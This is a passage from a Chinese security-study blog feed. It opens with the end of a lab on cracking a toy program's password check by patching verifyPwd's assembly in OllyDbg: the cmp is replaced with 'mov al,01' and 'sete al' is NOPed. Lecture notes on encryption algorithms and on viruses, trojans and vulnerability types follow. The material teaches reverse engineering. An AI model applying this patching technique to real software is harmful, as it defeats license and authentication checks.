title="破解方式二：修改函数返回值"></a>破解方式二：修改函数返回值</h3><p>更改函数。通过分析汇编语句，可知，验证命令使用的是verifyPwd函数，<strong>点右键选择跟随，逐步进入该函数</strong>：</p><p><img src="/2023/03/12/ruan-jian-diao-shi-ji-chu/ad005b778cd20e2fbe47e9c48e68a019.png" class="lazyload placeholder" data-srcset="/2023/03/12/ruan-jian-diao-shi-ji-chu/ad005b778cd20e2fbe47e9c48e68a019.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>函数的返回值通过eax寄存器来完成的，核心语句即sete al。<br>对于函数中的代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">flag=<span class="built_in">strcmp</span>(password, pwd); </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> flag0; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>被解释成汇编语言：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Mov dword ptr [ebp-8], eax </span><br><span class="line"></span><br><span class="line">//将strcmp函数调用后的返回值（存在eax中）赋值给变量flag</span><br><span class="line"></span><br><span class="line">Xor eax, eax</span><br><span class="line"></span><br><span class="line">//将eax的值清空</span><br><span class="line"></span><br><span class="line">Cmp dword ptr [ebp-8], 0 </span><br><span class="line"></span><br><span class="line">//将flag的值与0进行比较，即flag0;</span><br><span class="line">//注意cmp运算的结果只会影响一些状态寄存器的值</span><br><span class="line"></span><br><span class="line">Sete al </span><br><span class="line"></span><br><span class="line">//sete是根据状态寄存器的值，如果相等，则设置，如果不等，则不设置</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>要想更改该语句，在<code>cmp dword ptr [ebp-8], 0</code>处开始更改，将其更改为：<code>mov al,01</code>。<strong>取消保持代码空间大小</strong>，如果新代码超长，将无法完成更改。</p><p><img src="/2023/03/12/ruan-jian-diao-shi-ji-chu/7207ffe5780924a9c70bdc6b0a231766.png" class="lazyload placeholder" data-srcset="/2023/03/12/ruan-jian-diao-shi-ji-chu/7207ffe5780924a9c70bdc6b0a231766.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>并将sete al改为NOP。<br>得到结果如下：</p><p><img src="/2023/03/12/ruan-jian-diao-shi-ji-chu/90f29687fd62ce5a10978d358446f91f.png" class="lazyload placeholder" data-srcset="/2023/03/12/ruan-jian-diao-shi-ji-chu/90f29687fd62ce5a10978d358446f91f.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>运行结果校验破解正确性。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本章介绍了软件安全调试的基础知识，包括PE文件格式、虚拟内存，以及介绍了LordPE、OllyDBG、IDA Pro等用于逆向分析的工具。还给出了PE文件代码注入和软件破解两个示例，<del>后续如果有时间会分享这两个实验的录制视频，演示每一步实验细节。</del></p><p>内容参考自《软件安全：漏洞利用及渗透测试》，书中对于PE文件结构讲述并不到位，后续会发一篇博文，讲述PE文件结构有关内容。</p>]]></content>
      
      
      <categories>
          
          <category> 软件安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 调试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据加密算法</title>
      <link href="/2023/03/12/shu-ju-jia-mi-suan-fa/"/>
      <url>/2023/03/12/shu-ju-jia-mi-suan-fa/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是加密"><a href="#什么是加密" class="headerlink" title="什么是加密"></a>什么是加密</h2><p> 两种常见的网络安全方法</p><ol><li>基于密码的：基于密码学的算法和安全协议</li><li>基于系统的非加密的方法（防火墙，抗恶意软件，IDS等）</li></ol><p>加密：使明文变换为不可理解的文本，不可理解的文本可被复原成原始的明文（与哈希的区别）</p><p>两种常见的加密方法</p><ol><li><p>传统加密（也称为：对称加密）：加密和解密使用相同的密钥</p></li><li><p>公钥加密（也称为：非对称加密）：加密和解密使用不同的密钥</p></li></ol><p><img src="/2023/03/12/shu-ju-jia-mi-suan-fa/402d845c649d9de0280ff6a9cfd49eb9.png" class="lazyload placeholder" data-srcset="/2023/03/12/shu-ju-jia-mi-suan-fa/402d845c649d9de0280ff6a9cfd49eb9.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/12/shu-ju-jia-mi-suan-fa/0179de13f7d0c9c6d3fb5777cf846ff3.png" class="lazyload placeholder" data-srcset="/2023/03/12/shu-ju-jia-mi-suan-fa/0179de13f7d0c9c6d3fb5777cf846ff3.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>置换加密：基于字符的一一映射，这种方法具有基于语言的统计规律</p><p>XOR加密：将一个串分为等长的块，然后用等长的密钥加密每个块；不安全，易遭到已知明文攻击，可以采用一次一密的密码本。</p><br/><h2 id="加密算法的要求"><a href="#加密算法的要求" class="headerlink" title="加密算法的要求"></a>加密算法的要求</h2><p>若每个密钥只用一次，异或加密就是安全的，但在实际中很难实现。如果不公开加密算法呢？不利于研究加密算法本身的安全性。</p><p>为了便于研究加密算法的安全性，假定除了密钥以外的一切都是公开的，而且密钥可以重用。</p><p>好的加密算法必须满足以下标准：</p><ol><li>高效的运算</li></ol><p>算法所执行的运算必须在软硬件上便于实现，算法的时空复杂度应为输入规模的小系数线性函数。基本运算：异或、置换（一对一映射）、替换（多对一映射）、循环位移（置换的一种特殊形式）、有限域内的加法和乘法等运算</p><ol start="2"><li>抵御统计分析攻击</li></ol><p>统计分析攻击：分析密文C中字符出现的频率，可以得到其在明文M中所对应的原始字符。</p><p>抵御方法：扩散和混淆（平滑统计结构）</p><p>扩散：密文C中的每个bit应该依赖于明文M中的多个bit，且尽可能的均匀</p><p>产生扩散性可以对明文段执行某些特定的运算，如替换运算，并对新产生的二进制字符串如法重复数次</p><p>混淆：密文C中的每个bi应该依赖于秘钥K的多个bit，且尽可能的均匀</p><p>产生混淆性可通过生成K的子秘钥并且在不同的轮次使用不同的子密钥</p><ol start="3"><li>抵御暴力破解攻击</li></ol><p>密码算法安全性取决于算法和密钥的长度。假定密钥长度为l-bit，则密钥空间为2^l</p><p>若窃听者获得一份密文C，且知道加密算法，可以一次尝试一个密钥来破解密文</p><p>因此，暴力破解攻击的时间复杂度是O(2^l）。基于当前技术，普遍认为l = 128足够</p><p>暴力攻击的时间复杂度常用于衡量其它密码分析攻击的有效性（现在估计不是128了）</p><ol start="4"><li>抵御数学分析攻击</li></ol><p>抵御其他攻击：选择明文攻击和数学分析攻击</p><p>选择明文攻击：攻击者有目的地选择明文诱使加密系统加密，以破解其它密文</p><blockquote><p>二战美军情报部门截获日军密文中频繁出现的密文串，怀疑为“中途岛”。美军故意用明文发送一条情报，说中途岛上的一个设备出故障需要维修，诱使日军情报系统将其加密。美军经过密文比对验证了猜想。</p></blockquote><p>数学分析攻击：差分分析、线性分析、代数分析。需要很深的数学知识</p><ol start="5"><li>抵御侧信道攻击</li></ol><p>密码算法的实现必须能够抵御侧信道攻击。侧信道攻击探测实现环境的漏洞</p><p>计时攻击：攻击者分析特定运算的计算时间。如果当密钥具有不同的bit值时，特定运算的运算时间会发生明显变化，则计时攻击有效</p><p>抵御计时攻击：通过在执行指令时加入冗余运算来平滑计算时间</p><h2 id="DES加密算法"><a href="#DES加密算法" class="headerlink" title="DES加密算法"></a>DES加密算法</h2><p><img src="/2023/03/12/shu-ju-jia-mi-suan-fa/72c02541638689aef08f3a521cf5526e.png" class="lazyload placeholder" data-srcset="/2023/03/12/shu-ju-jia-mi-suan-fa/72c02541638689aef08f3a521cf5526e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/12/shu-ju-jia-mi-suan-fa/edd38b215ba9fba4fdcfe16a0400d332.png" class="lazyload placeholder" data-srcset="/2023/03/12/shu-ju-jia-mi-suan-fa/edd38b215ba9fba4fdcfe16a0400d332.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/12/shu-ju-jia-mi-suan-fa/04f30fe01168bb01cf0d792130de0d49.png" class="lazyload placeholder" data-srcset="/2023/03/12/shu-ju-jia-mi-suan-fa/04f30fe01168bb01cf0d792130de0d49.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/12/shu-ju-jia-mi-suan-fa/9f288ec3a40f98ca0256f87141082a05.png" class="lazyload placeholder" data-srcset="/2023/03/12/shu-ju-jia-mi-suan-fa/9f288ec3a40f98ca0256f87141082a05.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/12/shu-ju-jia-mi-suan-fa/883f6a1aef119e447aa55ba0a17612a6.png" class="lazyload placeholder" data-srcset="/2023/03/12/shu-ju-jia-mi-suan-fa/883f6a1aef119e447aa55ba0a17612a6.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/12/shu-ju-jia-mi-suan-fa/4ba91cc1b96668a7af6493f2ad52d164.png" class="lazyload placeholder" data-srcset="/2023/03/12/shu-ju-jia-mi-suan-fa/4ba91cc1b96668a7af6493f2ad52d164.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/12/shu-ju-jia-mi-suan-fa/20e2597ee3d432235a680b933e901eb6.png" class="lazyload placeholder" data-srcset="/2023/03/12/shu-ju-jia-mi-suan-fa/20e2597ee3d432235a680b933e901eb6.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/12/shu-ju-jia-mi-suan-fa/6d7fe57fbb98bb0cd223ccdcd162002e.png" class="lazyload placeholder" data-srcset="/2023/03/12/shu-ju-jia-mi-suan-fa/6d7fe57fbb98bb0cd223ccdcd162002e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/12/shu-ju-jia-mi-suan-fa/868ec86d131c09de7a28702e4b0125c1.png" class="lazyload placeholder" data-srcset="/2023/03/12/shu-ju-jia-mi-suan-fa/868ec86d131c09de7a28702e4b0125c1.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><br/><h2 id="多重DES"><a href="#多重DES" class="headerlink" title="多重DES"></a>多重DES</h2><p><img src="/2023/03/12/shu-ju-jia-mi-suan-fa/239e16139c4babee419c1643a85bf159.png" class="lazyload placeholder" data-srcset="/2023/03/12/shu-ju-jia-mi-suan-fa/239e16139c4babee419c1643a85bf159.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/12/shu-ju-jia-mi-suan-fa/192cb2ac71a647621762032c6382d119.png" class="lazyload placeholder" data-srcset="/2023/03/12/shu-ju-jia-mi-suan-fa/192cb2ac71a647621762032c6382d119.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/12/shu-ju-jia-mi-suan-fa/9deeed9a18b36d03ab96294b2887b5b1.png" class="lazyload placeholder" data-srcset="/2023/03/12/shu-ju-jia-mi-suan-fa/9deeed9a18b36d03ab96294b2887b5b1.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/12/shu-ju-jia-mi-suan-fa/d828619c43d1a4fcb72af8e7df7d657f.png" class="lazyload placeholder" data-srcset="/2023/03/12/shu-ju-jia-mi-suan-fa/d828619c43d1a4fcb72af8e7df7d657f.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="高级加密标准"><a href="#高级加密标准" class="headerlink" title="高级加密标准"></a>高级加密标准</h2><p><img src="/2023/03/12/shu-ju-jia-mi-suan-fa/a68b68b4dc3ab95e0ba47b1a1638381e.png" class="lazyload placeholder" data-srcset="/2023/03/12/shu-ju-jia-mi-suan-fa/a68b68b4dc3ab95e0ba47b1a1638381e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/12/shu-ju-jia-mi-suan-fa/01ac48dfd4f20e191834c055a4466cc9.png" class="lazyload placeholder" data-srcset="/2023/03/12/shu-ju-jia-mi-suan-fa/01ac48dfd4f20e191834c055a4466cc9.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/12/shu-ju-jia-mi-suan-fa/f50be01bb26bc408d07bd32b6dd8005e.png" class="lazyload placeholder" data-srcset="/2023/03/12/shu-ju-jia-mi-suan-fa/f50be01bb26bc408d07bd32b6dd8005e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/12/shu-ju-jia-mi-suan-fa/00ab887ad847dfa25c51eb9b2e043f16.png" class="lazyload placeholder" data-srcset="/2023/03/12/shu-ju-jia-mi-suan-fa/00ab887ad847dfa25c51eb9b2e043f16.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/12/shu-ju-jia-mi-suan-fa/8a261e8e8a7ef84e0d0d46dc87ec9644.png" class="lazyload placeholder" data-srcset="/2023/03/12/shu-ju-jia-mi-suan-fa/8a261e8e8a7ef84e0d0d46dc87ec9644.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/12/shu-ju-jia-mi-suan-fa/abc4b83ae91cdab1424987fd2764b97f.png" class="lazyload placeholder" data-srcset="/2023/03/12/shu-ju-jia-mi-suan-fa/abc4b83ae91cdab1424987fd2764b97f.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/12/shu-ju-jia-mi-suan-fa/1941ca6a980583bcc590fb96c814bdee.png" class="lazyload placeholder" data-srcset="/2023/03/12/shu-ju-jia-mi-suan-fa/1941ca6a980583bcc590fb96c814bdee.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/12/shu-ju-jia-mi-suan-fa/150efe267d03a02aeca819a0cd3f8eb3.png" class="lazyload placeholder" data-srcset="/2023/03/12/shu-ju-jia-mi-suan-fa/150efe267d03a02aeca819a0cd3f8eb3.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><br/><h2 id="分组密码的工作模式"><a href="#分组密码的工作模式" class="headerlink" title="分组密码的工作模式"></a>分组密码的工作模式</h2><p><img src="/2023/03/12/shu-ju-jia-mi-suan-fa/3261c85d843ee108dd7ed371a840789f.png" class="lazyload placeholder" data-srcset="/2023/03/12/shu-ju-jia-mi-suan-fa/3261c85d843ee108dd7ed371a840789f.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/12/shu-ju-jia-mi-suan-fa/0006100afc19c3d6db033a6b0ba43c03.png" class="lazyload placeholder" data-srcset="/2023/03/12/shu-ju-jia-mi-suan-fa/0006100afc19c3d6db033a6b0ba43c03.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/12/shu-ju-jia-mi-suan-fa/05830bbb3cc0dc6b9b9d4e4957a6ad25.png" class="lazyload placeholder" data-srcset="/2023/03/12/shu-ju-jia-mi-suan-fa/05830bbb3cc0dc6b9b9d4e4957a6ad25.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/12/shu-ju-jia-mi-suan-fa/5ddb721a85e2ead78d19d0e66df6407c.png" class="lazyload placeholder" data-srcset="/2023/03/12/shu-ju-jia-mi-suan-fa/5ddb721a85e2ead78d19d0e66df6407c.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/12/shu-ju-jia-mi-suan-fa/76fe852f439f75cc0216ece52da2a5e0.png" class="lazyload placeholder" data-srcset="/2023/03/12/shu-ju-jia-mi-suan-fa/76fe852f439f75cc0216ece52da2a5e0.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/12/shu-ju-jia-mi-suan-fa/44d897a6ae4e5d682eb83ab4a887c9bd.png" class="lazyload placeholder" data-srcset="/2023/03/12/shu-ju-jia-mi-suan-fa/44d897a6ae4e5d682eb83ab4a887c9bd.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><br/><h2 id="流密码和密钥生成"><a href="#流密码和密钥生成" class="headerlink" title="流密码和密钥生成"></a>流密码和密钥生成</h2><p><img src="/2023/03/12/shu-ju-jia-mi-suan-fa/35dc126549673afa5470cc50246580d6.png" class="lazyload placeholder" data-srcset="/2023/03/12/shu-ju-jia-mi-suan-fa/35dc126549673afa5470cc50246580d6.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/12/shu-ju-jia-mi-suan-fa/12f9d7cff023b82c5106245bd358befe.png" class="lazyload placeholder" data-srcset="/2023/03/12/shu-ju-jia-mi-suan-fa/12f9d7cff023b82c5106245bd358befe.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/12/shu-ju-jia-mi-suan-fa/81293a0e4c223c4bb6c93662ebe62b42.png" class="lazyload placeholder" data-srcset="/2023/03/12/shu-ju-jia-mi-suan-fa/81293a0e4c223c4bb6c93662ebe62b42.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/12/shu-ju-jia-mi-suan-fa/6d92f14212c2e8fc87511a7ddd010581.png" class="lazyload placeholder" data-srcset="/2023/03/12/shu-ju-jia-mi-suan-fa/6d92f14212c2e8fc87511a7ddd010581.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/12/shu-ju-jia-mi-suan-fa/7d7ffa3baf4fd00404361a2cf14f5c07.png" class="lazyload placeholder" data-srcset="/2023/03/12/shu-ju-jia-mi-suan-fa/7d7ffa3baf4fd00404361a2cf14f5c07.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/12/shu-ju-jia-mi-suan-fa/dd638b3ca41bb75d434643345086d1d0.png" class="lazyload placeholder" data-srcset="/2023/03/12/shu-ju-jia-mi-suan-fa/dd638b3ca41bb75d434643345086d1d0.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/12/shu-ju-jia-mi-suan-fa/a7e2e42b37d337b71d775e640a32ee8d.png" class="lazyload placeholder" data-srcset="/2023/03/12/shu-ju-jia-mi-suan-fa/a7e2e42b37d337b71d775e640a32ee8d.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/12/shu-ju-jia-mi-suan-fa/82ebd69d048fe3691a497804b0df1485.png" class="lazyload placeholder" data-srcset="/2023/03/12/shu-ju-jia-mi-suan-fa/82ebd69d048fe3691a497804b0df1485.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/12/shu-ju-jia-mi-suan-fa/4c5a6c70b0231960ab8612a0e338322d.png" class="lazyload placeholder" data-srcset="/2023/03/12/shu-ju-jia-mi-suan-fa/4c5a6c70b0231960ab8612a0e338322d.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/12/shu-ju-jia-mi-suan-fa/788933e4266fb4278cd7b9d85b580999.png" class="lazyload placeholder" data-srcset="/2023/03/12/shu-ju-jia-mi-suan-fa/788933e4266fb4278cd7b9d85b580999.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/12/shu-ju-jia-mi-suan-fa/7c16cac88f95ba264af7bea5fac6dbeb.png" class="lazyload placeholder" data-srcset="/2023/03/12/shu-ju-jia-mi-suan-fa/7c16cac88f95ba264af7bea5fac6dbeb.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/12/shu-ju-jia-mi-suan-fa/a4c933a766d778eec21651d09c5db9e9.png" class="lazyload placeholder" data-srcset="/2023/03/12/shu-ju-jia-mi-suan-fa/a4c933a766d778eec21651d09c5db9e9.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>软件安全预备知识</title>
      <link href="/2023/03/11/ruan-jian-an-quan-yu-bei-zhi-shi/"/>
      <url>/2023/03/11/ruan-jian-an-quan-yu-bei-zhi-shi/</url>
      
        <content type="html"><![CDATA[<h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><h2 id="病毒和木马"><a href="#病毒和木马" class="headerlink" title="病毒和木马"></a>病毒和木马</h2><h3 id="病毒-computer-Virus"><a href="#病毒-computer-Virus" class="headerlink" title="病毒(computer Virus)"></a>病毒(computer Virus)</h3><p>”指编制或者在计算机程序中插入的破坏计算机功能或者破坏数据，影响计算机使用并且能够<strong>自我复制</strong>的一组计算机指令或者程序代码“。</p><h4 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h4><ul><li>感染性</li><li>潜伏性</li><li>特定的触发性</li><li>破坏性</li></ul><h4 id="满足两个条件"><a href="#满足两个条件" class="headerlink" title="满足两个条件"></a>满足两个条件</h4><ul><li>自我执行<blockquote><p>它通常将自己的代码置于另一个程序的执行路径中</p></blockquote></li><li>自我复制<blockquote><p>它可能用受病毒感染的文件副本替换其他可执行文件，病毒既可以感染个人计算机，也可以感染网络服务器。</p></blockquote></li></ul><h3 id="蠕虫-worm-病毒"><a href="#蠕虫-worm-病毒" class="headerlink" title="蠕虫(worm)病毒"></a>蠕虫(worm)病毒</h3><p>蠕虫病毒是一种常见的计算机病毒，它利用<strong>网络</strong>进行复制和传播。蠕虫病毒是自包含的程序（或是一套程序），它能传播自身功能的<strong>拷贝</strong>或自身的<strong>某些功能</strong>到其他的计算机系统中（通常是经过<strong>网络连接</strong>）。</p><p><img src="/2023/03/11/ruan-jian-an-quan-yu-bei-zhi-shi/c96ec693fffa9f03903747f1e5412daa.png" class="lazyload placeholder" data-srcset="/2023/03/11/ruan-jian-an-quan-yu-bei-zhi-shi/c96ec693fffa9f03903747f1e5412daa.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="普通病毒和蠕虫病毒的区别"><a href="#普通病毒和蠕虫病毒的区别" class="headerlink" title="普通病毒和蠕虫病毒的区别"></a>普通病毒和蠕虫病毒的区别</h3><ul><li>复制方式<blockquote><p>普通病毒需要<strong>传播受感染的驻留文件</strong>来进行复制，而蠕虫不使用驻留文件即可在系统之间进行自我复制。</p></blockquote></li><li>传染目标<blockquote><p>普通病毒的传染能力主要是针对计算机内的<strong>文件系统</strong>而言，而蠕虫病毒的传染目标是*<strong>互联网内的所有计算机</strong>。</p></blockquote></li></ul><p><img src="/2023/03/11/ruan-jian-an-quan-yu-bei-zhi-shi/a5cb3abf300b2f984350b4a72815e299.png" class="lazyload placeholder" data-srcset="/2023/03/11/ruan-jian-an-quan-yu-bei-zhi-shi/a5cb3abf300b2f984350b4a72815e299.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="木马"><a href="#木马" class="headerlink" title="木马"></a>木马</h3><p>木马(Trojan Horse)，是指那些表面上是有用的软件，实际目的却是危害计算机安全并导致严重破坏的计算机程序。</p><ul><li>是一种基于<strong>远程控制</strong>的黑客工具</li><li>具有<strong>非授权性</strong><blockquote><p>是指一旦控制端与<strong>服务端</strong>连接后，控制端将窃取到服务端的很多操作权限，一旦中了木马，你的系统很可能门户大开，毫无秘密可言。</p></blockquote></li><li>具有<strong>隐蔽性</strong><blockquote><p>是指木马的设计者为了防止木马被发现，会采用多种手段隐藏木马，这样服务端即使发现感染了木马，也难以确定其具体位置。</p></blockquote></li></ul><h3 id="病毒和木马的区别"><a href="#病毒和木马的区别" class="headerlink" title="病毒和木马的区别"></a>病毒和木马的区别</h3><ul><li>木马不具有感染性，它不能像病毒那样复制自身，也并不刻意地感染其他文件，它主要通过将自身<strong>伪装</strong>起来，吸引用户下载执行。</li><li>木马一般主要以<strong>窃取用户相关信息</strong>或<strong>隐蔽性控制</strong>为主要目的。</li></ul><p>相对病毒而言，可以简单地说，病毒破坏你的信息，而木马窥视你。</p><h2 id="软件漏洞"><a href="#软件漏洞" class="headerlink" title="软件漏洞"></a>软件漏洞</h2><h3 id="软件安全漏洞"><a href="#软件安全漏洞" class="headerlink" title="软件安全漏洞"></a>软件安全漏洞</h3><h4 id="缺陷和漏洞"><a href="#缺陷和漏洞" class="headerlink" title="缺陷和漏洞"></a>缺陷和漏洞</h4><p>计算机软件是由计算机程序员开发出来的，不同程序员的编程水平不一样，就会造成软件存在这样或者那样的问题，这些问题可能会造成软件崩溃不能运行，我们称这些问题为<strong>软件缺陷</strong>(Bug)。</p><p>软件中存在的一些问题，可以在某种情况下被利用来对用户造成恶意攻击，比如给用户计算机上安装木马病毒，或者直接盗取用户计算机上的秘密信息，等等。这个时候软件的这些问题就不再是bug，而是一个<u>软件安全漏洞</u>，简称”<strong>软件漏洞</strong>“。</p><h4 id="电脑肉鸡"><a href="#电脑肉鸡" class="headerlink" title="电脑肉鸡"></a>电脑肉鸡</h4><p><strong>受别人控制的远程电脑</strong>。肉鸡可以是<u>各种系统</u>,如windows,linux,unix等；更可以是一家公司、企业、学校甚至是政府军队的<u>服务器</u>。如果服务器软件存在安全漏洞， 攻击者可以发起“主动”进攻，植入木马，将该服务器变为一个任人宰割的“肉鸡”。</p><p><img src="/2023/03/11/ruan-jian-an-quan-yu-bei-zhi-shi/124f32991e24ff4830822dfe12bed4cc.png" class="lazyload placeholder" data-srcset="/2023/03/11/ruan-jian-an-quan-yu-bei-zhi-shi/124f32991e24ff4830822dfe12bed4cc.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><br/><h3 id="漏洞产生的原因"><a href="#漏洞产生的原因" class="headerlink" title="漏洞产生的原因"></a>漏洞产生的原因</h3><p><img src="/2023/03/11/ruan-jian-an-quan-yu-bei-zhi-shi/d9b9f2b4055ca7050db492e8cdc73326.png" class="lazyload placeholder" data-srcset="/2023/03/11/ruan-jian-an-quan-yu-bei-zhi-shi/d9b9f2b4055ca7050db492e8cdc73326.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="漏洞分类"><a href="#漏洞分类" class="headerlink" title="漏洞分类"></a>漏洞分类</h3><p>按照漏洞生命周期的阶段进行分类：</p><h4 id="0Day漏洞"><a href="#0Day漏洞" class="headerlink" title="0Day漏洞"></a>0Day漏洞</h4><p>指还处于<strong>未公开状态</strong>的漏洞。这类漏洞只在攻击者个人或者小范围黑客团体内使用，网络用户和厂商都不知情，因此没有任何防范手段，危害非常大。</p><p>0day漏洞也是当前网络战中的<u>核武器</u>。</p><p><img src="/2023/03/11/ruan-jian-an-quan-yu-bei-zhi-shi/79b895f2ae6cf1bddd27738943112d77.png" class="lazyload placeholder" data-srcset="/2023/03/11/ruan-jian-an-quan-yu-bei-zhi-shi/79b895f2ae6cf1bddd27738943112d77.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h4 id="1Day漏洞"><a href="#1Day漏洞" class="headerlink" title="1Day漏洞"></a>1Day漏洞</h4><p>通常指发布补丁时间不长的漏洞。由于了解此漏洞并且安装补丁的人还不多，这种漏洞仍然存在一定的危害。</p><h4 id="已公开漏洞"><a href="#已公开漏洞" class="headerlink" title="已公开漏洞"></a>已公开漏洞</h4><p>已公开漏洞是指厂商已经发布补丁或修补方法，大多数用户都已打过补丁的漏洞。这类漏洞从技术上因为已经有防范手段，并且大部分用户已经进行了修补，危害比较小。</p><h3 id="漏洞产业链"><a href="#漏洞产业链" class="headerlink" title="漏洞产业链"></a>漏洞产业链</h3><p>网络黑客产业链是指黑客们运用技术手段入侵服务器获取站点权限，以及各类账户信息并从中谋取非法经济利益的一条产业链。</p><p><img src="/2023/03/11/ruan-jian-an-quan-yu-bei-zhi-shi/55a038bd3353732c638ec94bcb4369f5.png" class="lazyload placeholder" data-srcset="/2023/03/11/ruan-jian-an-quan-yu-bei-zhi-shi/55a038bd3353732c638ec94bcb4369f5.png" 